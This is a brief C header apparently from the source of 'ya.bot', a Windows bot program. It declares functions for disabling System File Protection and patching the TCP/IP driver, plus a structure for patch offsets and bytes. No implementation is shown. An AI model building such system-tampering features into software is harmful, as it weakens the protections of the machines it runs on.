/*  ya.bot  */

#ifndef NO_PATCH
bool patch_sfcdisable();
bool patch_tcpip();

typedef struct SPatchBytes
{
	DWORD dwOffset;
	char *pszValue;
} SPatchBytes;
#endif